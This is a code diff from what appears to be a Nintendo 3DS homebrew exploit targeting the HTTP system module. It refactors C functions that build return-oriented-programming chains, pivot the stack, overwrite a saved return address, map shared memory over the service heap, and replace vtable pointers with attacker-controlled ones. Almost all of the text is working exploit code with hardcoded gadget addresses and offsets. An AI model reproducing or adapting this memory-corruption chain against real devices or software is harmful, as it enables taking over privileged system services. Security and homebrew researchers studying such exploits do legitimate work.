@@ -65,6 +65,9 @@ u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE = 0x0011b744;//Vtable for the obj
 u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;
 
 static u32 ropvmem_base = 0x0f000000;
+u32 ropvmem_size = 0x1000;
+
+u32 httpheap_size = 0x22000;
 
 static u32 __custom_mainservsession_vtable;
 static u32 __custom_contextservsession_vtable;
@@ -311,9 +314,6 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	u32 *ropchain_ret2http = &tmpbuf[0xfd0>>2];
 	u32 ret2http_vaddr = sharedmembase+0xfd0;
 
-	u32 *new_ropchain = &tmpbuf[0x900>>2];
-	u32 http_newropvaddr = sharedmembase+0x900;
-
 	u32 closecontext_stackframe = 0x0011d398;//This is the stackframe address for the actual CloseContext function.
 
 	u32 regs[9] = {0};
@@ -324,9 +324,6 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 
 	u32 sharedmemvaddr_ctx0 = ropheap+0x0;
 	u32 sharedmemvaddr_ctx1 = ropheap+0x20;
-
-	__custom_mainservsession_vtable = ropvmem_base + 0xf00 - 0x108;
-	__custom_contextservsession_vtable = ropvmem_base + 0xf00 - 0x108*2;
 
 	target_overwrite_addr = closecontext_stackframe;
 	target_overwrite_addr-= 0xc;//Subtract by this value to get the address of the saved r5 which will be popped.
@@ -371,26 +368,23 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x98);//r0 = original value of r6(original_r7+0x98).
 	ropgen_strr0r1(&ropchain, &http_ropvaddr, ret2http_vaddr + 0xc, 1);//Write the calculated value for the original r6, to the ret2http ROP.
 
-	ropgen_svcControlMemory(&ropchain, &http_ropvaddr, http_ropvaddr+12, ropvmem_base, 0, 0x1000, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
-
-	http_newropvaddr = http_ropvaddr;
-	new_ropchain = ropchain;
+	ropgen_svcControlMemory(&ropchain, &http_ropvaddr, http_ropvaddr+12, ropvmem_base, 0, ropvmem_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
 
 	//Create sharedmem over the entire sysmodule heap, prior to the SOC-sharedmem.
-	ropgen_sharedmem_create(&new_ropchain, &http_newropvaddr, sharedmemvaddr_ctx1, 0x08000000, 0x22000, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);
+	ropgen_sharedmem_create(&ropchain, &http_ropvaddr, sharedmemvaddr_ctx1, 0x08000000, httpheap_size, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);
 
 	//Create sharedmem over the ropvmem.
-	ropgen_sharedmem_create(&new_ropchain, &http_newropvaddr, sharedmemvaddr_ctx0, ropvmem_base, 0x1000, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);
+	ropgen_sharedmem_create(&ropchain, &http_ropvaddr, sharedmemvaddr_ctx0, ropvmem_base, ropvmem_size, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);
 
 	//Setup the stack data which will be used once the above CreateContext vtable funcptr is used. This will stack-pivot to ropvmem_base.
 	
 	//The below commented block is actually for the context-session thread stack.
 	/*tmpval = closecontext_stackframe + 0x18 + 0x3c;
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, ROP_STACKPIVOT-4);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, tmpval, 1);
+	ropgen_setr0(&ropchain, &http_ropvaddr, ROP_STACKPIVOT-4);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, tmpval, 1);
 	tmpval+= 4;
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, ropvmem_base - (tmpval + 4));
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, tmpval, 1);*/
+	ropgen_setr0(&ropchain, &http_ropvaddr, ropvmem_base - (tmpval + 4));
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, tmpval, 1);*/
 
 	//Setup the stack-pivot mentioned above on the main-thread stack.
 	tmpdata_ptr = tmpdata;
@@ -398,87 +392,75 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	ropgen_stackpivot(&tmpdata_ptr, &tmpdata_addr, ropvmem_base);
 	tmpdata_addr-= 8;
 
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, tmpdata[0]);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, tmpdata_addr, 1);
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, tmpdata[1]);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, tmpdata_addr+4, 1);
+	ropgen_setr0(&ropchain, &http_ropvaddr, tmpdata[0]);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, tmpdata_addr, 1);
+	ropgen_setr0(&ropchain, &http_ropvaddr, tmpdata[1]);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, tmpdata_addr+4, 1);
 
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe + 0x14, 1);//Load the saved LR value in the httpc_cmdhandler func.
-	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xc);//r0+= 0xc.
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe + 0x14, 1);//Write the modified LR value back into the stackframe. Hence, the code which writes to the cmd-reply data will be skipped over.
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe + 0x14, 1);//Load the saved LR value in the httpc_cmdhandler func.
+	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0xc);//r0+= 0xc.
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe + 0x14, 1);//Write the modified LR value back into the stackframe. Hence, the code which writes to the cmd-reply data will be skipped over.
 
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
-	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xfffffffc);
-	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf-4
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x00030045);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[0] = 0x00030045
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
+	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0xfffffffc);
+	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf-4
+	ropgen_setr0(&ropchain, &http_ropvaddr, 0x00030045);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[0] = 0x00030045
 
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
-	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[1] = 0x0
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
+	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf
+	ropgen_setr0(&ropchain, &http_ropvaddr, 0x0);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[1] = 0x0
 
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
-	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x4);//r0+= 0x4.
-	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x4
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x10 | ((0x2-1)<<26));
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[2] = <translate-header for sending two handles which get closed in the HTTP process>
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
+	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x4);//r0+= 0x4.
+	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf+0x4
+	ropgen_setr0(&ropchain, &http_ropvaddr, 0x10 | ((0x2-1)<<26));
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[2] = <translate-header for sending two handles which get closed in the HTTP process>
 
 	//Write the httpheap sharedmem handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, sharedmemvaddr_ctx1+0x14, 1);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, http_newropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, sharedmemvaddr_ctx1+0x14, 1);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, http_ropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);
 
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
-	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x8);//r0+= 0x8.
-	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x8
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[3] = <value written by the above ROP>
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
+	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x8);//r0+= 0x8.
+	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf+0x8
+	ropgen_setr0(&ropchain, &http_ropvaddr, 0x0);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[3] = <value written by the above ROP>
 
 	//Write the ropvmem sharedmem handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, sharedmemvaddr_ctx0+0x14, 1);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, http_newropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, sharedmemvaddr_ctx0+0x14, 1);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, http_ropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);
 
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
-	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xc);//r0+= 0xc.
-	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0xc
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[4] = <value written by the above ROP>
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
+	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0xc);//r0+= 0xc.
+	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf+0xc
+	ropgen_setr0(&ropchain, &http_ropvaddr, 0x0);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[4] = <value written by the above ROP>
 
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
-	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x10);//r0+= 0x10.
-	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x10
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[5] = 0x0
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
+	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x10);//r0+= 0x10.
+	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf+0x10
+	ropgen_setr0(&ropchain, &http_ropvaddr, 0x0);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[5] = 0x0
 
 	//Write the ssl:C handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, ROP_SSLC_STATE + 24, 1);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, http_newropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, ROP_SSLC_STATE + 24, 1);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, http_ropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);
 
-	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
-	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x14);//r0+= 0x14.
-	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x14
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[6] = <value written by the above ROP>
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
+	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x14);//r0+= 0x14.
+	ropgen_movr1r0(&ropchain, &http_ropvaddr);//r1 = cmdbuf+0x14
+	ropgen_setr0(&ropchain, &http_ropvaddr, 0x0);
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, 0, 0);//cmdbuf[6] = <value written by the above ROP>
 
-	ropgen_stackpivot(&new_ropchain, &http_newropvaddr, ret2http_vaddr);//Pivot to the return-to-http ROP-chain.
+	ropgen_stackpivot(&ropchain, &http_ropvaddr, ret2http_vaddr);//Pivot to the return-to-http ROP-chain.
 
-	if(http_newropvaddr > sharedmembase+0xfd0)
+	if(http_ropvaddr > sharedmembase+0xfd0)
 	{
-		printf("http_newropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_newropvaddr - (sharedmembase+0xfd0)));
+		printf("http_ropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_ropvaddr - (sharedmembase+0xfd0)));
 		return -2;
 	}
-
-	/*if(http_newropvaddr > __custom_mainservsession_vtable)
-	{
-		printf("http_newropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_newropvaddr - __custom_mainservsession_vtable));
-		return -2;
-	}*/
-
-	/*if(http_newropvaddr - ropvmem_base > 0x6d0)
-	{
-		printf("The ROP data for http_newropvaddr is 0x%08x-bytes too large to fit in the allocated sharedmem area.\n", (unsigned int)((http_newropvaddr - ropvmem_base) - 0x6d0));
-		return -2;
-	}*/
 
 	regs[7] = 0x0011c418;//Set fp to the original value.
 
@@ -490,7 +472,7 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	return 0;
 }
 
-Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_sharedmem_size, vu32 *ropvmem_sharedmem, u32 ropvmem_sharedmem_size)
+Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, vu32 *ropvmem_sharedmem)
 {
 	u32 pos;
 
@@ -507,6 +489,9 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 	u32 *ptr;
 
 	u32 params[7] = {0};
+
+	__custom_mainservsession_vtable = ropvmem_base + 0xf00 - 0x108;
+	__custom_contextservsession_vtable = ropvmem_base + 0xf00 - 0x108*2;
 
 	//Setup the ROP-chain used by the CreateContext vtable funcptr.
 
@@ -598,7 +583,7 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 
 	//Overwrite every vtable ptr with the target value with the custom one.
 
-	for(pos=0; pos<(httpheap_sharedmem_size>>2); pos++)
+	for(pos=0; pos<(httpheap_size>>2); pos++)
 	{
 		if(httpheap_sharedmem[pos] != ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE)continue;
 
